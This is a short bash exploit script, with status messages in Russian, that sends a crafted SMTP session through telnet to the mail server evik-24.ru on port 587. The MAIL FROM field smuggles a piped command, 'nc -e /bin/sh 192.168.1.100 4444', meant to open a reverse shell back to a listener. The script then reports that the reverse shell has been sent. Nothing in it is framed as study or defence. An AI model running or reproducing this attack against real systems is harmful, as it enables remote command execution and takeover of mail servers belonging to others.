#!/bin/bash
echo "Отправка эксплойта на evik-24.ru:587..."
(
  sleep 2; echo "HELO attacker.com"
  sleep 1; echo "MAIL FROM: <'|nc -e /bin/sh 192.168.1.100 4444'>"
  sleep 1; echo "RCPT TO: <admin@evik-24.ru>"
  sleep 1; echo "DATA"
  sleep 1; echo "Subject: RCE"
  sleep 1; echo "."
  sleep 1; echo "QUIT"
) | telnet evik-24.ru 587
echo "[+] Reverse-shell отправлен. Слушайте порт 4444."